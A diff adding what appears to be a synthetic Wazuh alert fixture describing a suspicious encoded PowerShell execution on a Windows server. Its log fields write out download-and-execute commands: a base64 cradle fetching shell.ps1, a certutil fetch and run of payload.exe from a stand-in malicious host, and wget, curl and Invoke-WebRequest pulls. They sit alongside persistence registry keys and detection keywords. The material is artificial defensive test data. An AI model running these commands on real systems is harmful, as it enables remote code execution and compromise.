@@ -1,0 +1,97 @@
+{
+  "timestamp": "2025-06-21T14:32:15.847Z",
+  "agent": {
+    "id": "001",
+    "name": "web-server-01",
+    "ip": "192.168.1.100"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "1640095935.12345",
+  "cluster": {
+    "name": "wazuh-cluster",
+    "node": "master"
+  },
+  "rule": {
+    "id": "31106",
+    "level": 12,
+    "description": "Suspicious PowerShell execution with encoded commands detected",
+    "groups": ["windows", "powershell", "malware"],
+    "mitre": {
+      "id": ["T1059.001", "T1027"],
+      "tactic": ["Execution", "Defense Evasion"],
+      "technique": ["PowerShell", "Obfuscated Files or Information"]
+    }
+  },
+  "decoder": {
+    "name": "windows-powershell"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "commandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
+        "processId": "4892",
+        "parentProcessId": "1234",
+        "user": "SYSTEM",
+        "processName": "powershell.exe",
+        "parentProcessName": "cmd.exe",
+        "logonId": "0x3e7",
+        "processGuid": "{a4b8c6d2-1234-5678-9abc-def012345678}",
+        "parentProcessGuid": "{b5c9d7e3-2345-6789-abcd-ef0123456789}",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parentImage": "C:\\Windows\\System32\\cmd.exe",
+        "currentDirectory": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\",
+        "targetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\malware_sample.exe",
+        "creationUtcTime": "2025-06-21 14:32:10.123",
+        "md5": "5d41402abc4b2a76b9719d911017c592",
+        "sha1": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
+        "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
+        "fileVersion": "1.0.0.0",
+        "company": "Malicious Corp",
+        "description": "Suspicious executable",
+        "product": "BadSoftware"
+      },
+      "system": {
+        "eventID": "4688",
+        "keywords": "0x8020000000000000",
+        "providerName": "Microsoft-Windows-Security-Auditing",
+        "systemTime": "2025-06-21T14:32:15.8470000Z",
+        "computer": "WEB-SERVER-01.contoso.local",
+        "processID": "516",
+        "threadID": "5284",
+        "channel": "Security",
+        "eventRecordID": "123456789",
+        "activityID": "{12345678-1234-5678-9abc-def012345678}",
+        "relatedActivityID": "{87654321-4321-8765-dcba-210fedcba987}"
+      }
+    }
+  },
+  "location": "EventChannel",
+  "syscheck": {
+    "path": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\malware_sample.exe",
+    "mode": "scheduled",
+    "size_before": "0",
+    "size_after": "2048576",
+    "perm_after": "100666",
+    "uid_after": "1000",
+    "gid_after": "1000",
+    "md5_before": "",
+    "md5_after": "5d41402abc4b2a76b9719d911017c592",
+    "sha1_after": "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
+    "sha256_after": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
+    "attrs_after": "32",
+    "event": "added"
+  },
+  "predecoder": {
+    "program_name": "WinEvtLog",
+    "timestamp": "Jun 21 14:32:15"
+  },
+  "input": {
+    "type": "log"
+  },
+  "full_log": "2025 Jun 21 14:32:15 WEB-SERVER-01.contoso.local WinEvtLog: Security: AUDIT_SUCCESS(4688): Microsoft-Windows-Security-Auditing: (no user): no domain: WEB-SERVER-01.contoso.local: A new process has been created. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY Logon ID: 0x3E7 Process Information: New Process ID: 0x131c New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: %%1938 Mandatory Label: S-1-16-16384 Creator Process ID: 0x4d2 Creator Process Name: C:\\Windows\\System32\\cmd.exe Process Command Line: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA== Network connections established to suspicious domains: evil-c2-server.tk, malware-distribution.bit, phishing-site.cf, backdoor-command.onion. File creation detected at C:\\Users\\Administrator\\AppData\\Local\\Temp\\malware_sample.exe with MD5: 5d41402abc4b2a76b9719d911017c592, SHA1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d, SHA256: 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae. Registry modifications: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware, HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence. Suspicious processes: rundll32.exe, regsvr32.exe, certutil.exe, bitsadmin.exe, mshta.exe, wscript.exe, cscript.exe. Command execution: cmd.exe /c certutil -urlcache -split -f http://evil-server.tk/payload.exe C:\\temp\\payload.exe && C:\\temp\\payload.exe. Network activity detected: wget http://192.168.100.50:8080/malware.zip, curl -O http://10.0.0.100/trojan.bat, invoke-webrequest -uri https://attacker-site.ml/backdoor.ps1 -outfile C:\\temp\\backdoor.ps1. File system activity: copy \\\\192.168.1.200\\share\\malware.exe C:\\temp\\, xcopy /s /h /e \\\\evil-share.local\\tools\\* C:\\Windows\\System32\\. Email indicators: attacker@evil-domain.tk, phishing@malicious-site.ga, backdoor@command-control.cf. Suspicious URLs detected: http://127.0.0.1:8080/shell.ps1, https://evil-c2-server.tk/api/download, http://192.168.100.50:9999/payload, https://malware-distribution.bit/samples/trojan.exe, http://10.0.0.100:8888/commands, https://phishing-site.cf/steal-credentials. Additional suspicious file paths: C:\\Windows\\Temp\\evil.dll, C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.bat, C:\\Users\\Public\\Documents\\trojan.vbs, C:\\temp\\backdoor.js, \\\\192.168.1.200\\share\\tools\\keylogger.jar, C:\\Windows\\System32\\drivers\\rootkit.sys. Process execution chain: cmd.exe -> powershell.exe -> invoke-expression -> frombase64string -> downloadstring. Detection keywords: malware, trojan, suspicious, blocked, quarantine, virus, backdoor, rootkit, keylogger, detected, alert, threat. Encoded payload analysis reveals: iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/shell.ps1'). Target: Windows Server 2019, User: Administrator, Domain: contoso.local",
+  "fields": {
+    "timestamp": "2025-06-21T14:32:15.847Z"
+  }
+}
